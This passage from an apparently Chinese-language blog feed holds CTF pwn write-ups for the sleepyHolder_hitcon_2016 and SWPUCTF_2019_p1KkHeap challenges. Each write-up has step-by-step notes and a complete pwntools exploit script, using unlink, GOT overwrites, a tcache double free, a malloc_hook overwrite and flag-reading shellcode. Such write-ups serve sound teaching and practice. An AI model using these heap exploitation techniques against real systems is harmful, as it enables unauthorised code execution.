class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">dele(<span class="number">2</span>) <span class="comment">#unlink</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/31/As5D5.png" alt="image-20231031173510102"></p><h5 id="注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1"><a href="#注意堆0时0x6020d0-堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0-d8-dc的地址-有则表示1-堆1虽已dele，但是只是为了后面方便改指针，全都写成1" class="headerlink" title="注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1"></a>注意堆0时0x6020d0,堆1时0x6020c0，刚开始不太清楚为什么后面要补这么多1，后面看向add函数，堆0，1，2分别对应着0x6020e0,d8,dc的地址,有则表示1,堆1虽已dele，但是只是为了后面方便改指针，全都写成1</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0</span>)+p64(<span class="number">0x6020c0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)  <span class="comment">#8</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/31/Axq5v.png" alt="image-20231031175111527"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(2,p64(0x400760))  #put_plt</span><br><span class="line">edit(1,p64(0x602020))  #puts_got</span><br></pre></td></tr></tbody></table></figure><h5 id="把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址"><a href="#把free-got改写的内容改成puts-plt-可以执行puts函数，堆0的指针写上puts-got-然后dele堆1，就会打印出地址" class="headerlink" title="把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址"></a>把free_got改写的内容改成puts_plt,可以执行puts函数，堆0的指针写上puts_got,然后dele堆1，就会打印出地址</h5><p><img src="https://i0.imgs.ovh/2023/10/31/AxaJ9.png" alt="image-20231031175406206"></p><h5 id="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"><a href="#然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0" class="headerlink" title="然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0"></a>然后算出偏移，算出system函数的地址，再edit堆0，0x6020c0</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(elf.got[<span class="string">'atoi'</span>])+p64(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload) </span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/31/AKQhe.png" alt="image-20231031180043302"></p><h5 id="再edit堆2，写上system的地址，"><a href="#再edit堆2，写上system的地址，" class="headerlink" title="再edit堆2，写上system的地址，"></a>再edit堆2，写上system的地址，</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>,p64(system))</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/31/AKRU3.png" alt="image-20231031180248465"></p><h5 id="主函数菜单那里还有个atoi函数，写上’sh’即可"><a href="#主函数菜单那里还有个atoi函数，写上’sh’即可" class="headerlink" title="主函数菜单那里还有个atoi函数，写上’sh’即可"></a>主函数菜单那里还有个atoi函数，写上’sh’即可</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",)</span></span><br><span class="line">p=process(<span class="string">"./sleepyHolder_hitcon_2016"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>)</span><br><span class="line">elf=ELF(<span class="string">'./sleepyHolder_hitcon_2016'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">chose,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'3. Renew secret\n'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'What secret do you want to keep?'</span>,<span class="built_in">str</span>(chose))</span><br><span class="line">    p.sendafter(<span class="string">'Tell me your secret: '</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'3. Renew secret\n'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Which Secret do you want to wipe?'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">ch,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'3. Renew secret\n'</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Which Secret do you want to renew?'</span>,<span class="built_in">str</span>(ch))</span><br><span class="line">    p.sendafter(<span class="string">'Tell me your secret: '</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'AAAA'</span>) </span><br><span class="line">add(<span class="number">2</span>,<span class="string">'BBBB'</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'cccc'</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'aaaa'</span>) </span><br><span class="line"></span><br><span class="line">fd=<span class="number">0x6020d0</span>-<span class="number">0x18</span></span><br><span class="line">bk=<span class="number">0x6020d0</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(fd)+p64(bk)+p64(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>) <span class="comment">#7 unlink</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0</span>)+p64(<span class="number">0x6020c0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)  <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0x400760</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x602020</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dele(2)</span></span><br><span class="line">p.recvuntil(<span class="string">'2. Big secret'</span>)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">base=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(elf.got[<span class="string">'atoi'</span>])+p64(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)+p32(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'3. Renew secret\n'</span>,<span class="string">'sh\n'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SWPUCTF_2019_p1KkHeap</title>
      <link href="//posts/a25249b0/"/>
      <url>//posts/a25249b0/</url>
      
        <content type="html"><![CDATA[<h5 id="所有操作总共限制在了0x12次"><a href="#所有操作总共限制在了0x12次" class="headerlink" title="所有操作总共限制在了0x12次"></a>所有操作总共限制在了0x12次</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV5dU.png" alt="image-20231029175834785"></p><h5 id="保护全开，限制了堆的大小在0x100，不能绕过tachebin机制"><a href="#保护全开，限制了堆的大小在0x100，不能绕过tachebin机制" class="headerlink" title="保护全开，限制了堆的大小在0x100，不能绕过tachebin机制"></a>保护全开，限制了堆的大小在0x100，不能绕过tachebin机制</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVjMs.png" alt="image-20231029175545040"></p><h5 id="dele时没有将bss段上的堆指针清零，存在double-free漏洞"><a href="#dele时没有将bss段上的堆指针清零，存在double-free漏洞" class="headerlink" title="dele时没有将bss段上的堆指针清零，存在double free漏洞"></a>dele时没有将bss段上的堆指针清零，存在double free漏洞</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AV4uX.png" alt="image-20231029175653199"></p><h5 id="最多只能申请8次堆"><a href="#最多只能申请8次堆" class="headerlink" title="最多只能申请8次堆"></a>最多只能申请8次堆</h5><p><img src="https://i0.imgs.ovh/2023/10/29/AVdF0.png" alt="image-20231029175951307"></p><h5 id="本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。"><a href="#本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。" class="headerlink" title="本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。"></a>本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x40</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x40</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">m0_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m0_addr))</span><br><span class="line"><span class="comment">#add(0x10,)</span></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(m0_addr+<span class="number">0x50</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x421</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/29/AVy8l.png" alt="image-20231029190203419"></p><h5 id="这里libc2-27有一种特性，tcache-perthread-struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20-最多放7个，放完就放fastbin和unsortedbin里。"><a href="#这里libc2-27有一种特性，tcache-perthread-struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20-最多放7个，放完就放fastbin和unsortedbin里。" class="headerlink" title="这里libc2.27有一种特性，tcache_perthread_struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20,最多放7个，放完就放fastbin和unsortedbin里。"></a>这里libc2.27有一种特性，tcache_perthread_struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20,最多放7个，放完就放fastbin和unsortedbin里。</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALhDX.png" alt="image-20231029203053580"></p><h5 id="在主函数里有一个函数"><a href="#在主函数里有一个函数" class="headerlink" title="在主函数里有一个函数"></a>在主函数里有一个函数</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALSVt.png" alt="image-20231029205210736"></p><h5 id="它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行"><a href="#它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行" class="headerlink" title="它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行"></a>它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行</h5><p><img src="https://i0.imgs.ovh/2023/10/29/ALukm.png" alt="image-20231029205237233"></p><h5 id="首先先计算出tcache-perthread-struct结构体的地址，这里可以直接对一个堆释放两次"><a href="#首先先计算出tcache-perthread-struct结构体的地址，这里可以直接对一个堆释放两次" class="headerlink" title="首先先计算出tcache_perthread_struct结构体的地址，这里可以直接对一个堆释放两次"></a>首先先计算出tcache_perthread_struct结构体的地址，这里可以直接对一个堆释放两次</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">tache_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-<span class="number">0x360</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tache_addr))</span><br></pre></td></tr></tbody></table></figure><h5 id="再申请堆就能直接修改堆指针-改到tache-perthread-struct开始的地址"><a href="#再申请堆就能直接修改堆指针-改到tache-perthread-struct开始的地址" class="headerlink" title="再申请堆就能直接修改堆指针,改到tache_perthread_struct开始的地址"></a>再申请堆就能直接修改堆指针,改到tache_perthread_struct开始的地址</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(tache_addr))</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/29/ALONR.png" alt="image-20231029210730885"></p><h5 id="再申请两次，在tache-perthread能改到下面的地址-相对开始的偏移是0xc8-这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关"><a href="#再申请两次，在tache-perthread能改到下面的地址-相对开始的偏移是0xc8-这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关" class="headerlink" title="再申请两次，在tache_perthread能改到下面的地址,相对开始的偏移是0xc8,这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关"></a>再申请两次，在tache_perthread能改到下面的地址,相对开始的偏移是0xc8,这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#4</span></span><br><span class="line">vmmap=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0xb8</span>*<span class="string">'\x00'</span>+p64(vmmap))</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/29/AL1xd.png" alt="image-20231029213256159"></p><h5 id="再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300-其实后面改成shellcode以后的地址都可以，比如0x66660040以后"><a href="#再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300-其实后面改成shellcode以后的地址都可以，比如0x66660040以后" class="headerlink" title="再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300,其实后面改成shellcode以后的地址都可以，比如0x66660040以后"></a>再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300,其实后面改成shellcode以后的地址都可以，比如0x66660040以后</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#5</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">'flag'</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x66660300</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,<span class="number">0x66660300</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">5</span>,shellcode)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/29/ALEZe.png" alt="image-20231029214310944"></p><h5 id="当tache-perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele-0-会放在unsortedbin，因为大于0x80，此时可以泄露main-arena-96的地址，这个地址减0x70就是malloc-hook的地址"><a href="#当tache-perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele-0-会放在unsortedbin，因为大于0x80，此时可以泄露main-arena-96的地址，这个地址减0x70就是malloc-hook的地址" class="headerlink" title="当tache_perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele(0)会放在unsortedbin，因为大于0x80，此时可以泄露main_arena+96的地址，这个地址减0x70就是malloc_hook的地址"></a>当tache_perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele(0)会放在unsortedbin，因为大于0x80，此时可以泄露main_arena+96的地址，这个地址减0x70就是malloc_hook的地址</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">malloc_hook=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/29/AXnaN.png" alt="image-20231029221645764"></p><h5 id="再以相同的方式改掉tachebin的地址"><a href="#再以相同的方式改掉tachebin的地址" class="headerlink" title="再以相同的方式改掉tachebin的地址"></a>再以相同的方式改掉tachebin的地址</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>,<span class="number">0xb8</span>*<span class="string">'\x00'</span>+p64(malloc_hook))</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2023/10/29/AXrKU.png" alt="image-20231029221302095"></p><h5 id="再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权"><a href="#再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权" class="headerlink" title="再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权"></a>再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",)</span></span><br><span class="line">p=process(<span class="string">"./SWPUCTF_2019_p1KkHeap"</span>)</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Your Choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Your Choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'id: '</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Your Choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'id: '</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'content: '</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">'Your Choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'id: '</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#1</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">tache_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-<span class="number">0x360</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tache_addr))</span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(tache_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#4</span></span><br><span class="line">vmmap=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0xb8</span>*<span class="string">'\x00'</span>+p64(vmmap))</span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#5</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">'flag'</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x66660300</span>,<span class="number">0x30</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,<span class="number">0x66660300</span>,<span class="number">0x30</span>)</span><br><span class="line">edit(<span class="number">5</span>,asm(shellcode))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">malloc_hook=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-<span class="number">0x70</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"><span class="comment">#dele(0)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0xb8</span>*<span class="string">'\x00'</span>+p64(malloc_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#6</span></span><br><span class="line">edit(<span class="number">6</span>,p64(vmmap))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar</title>
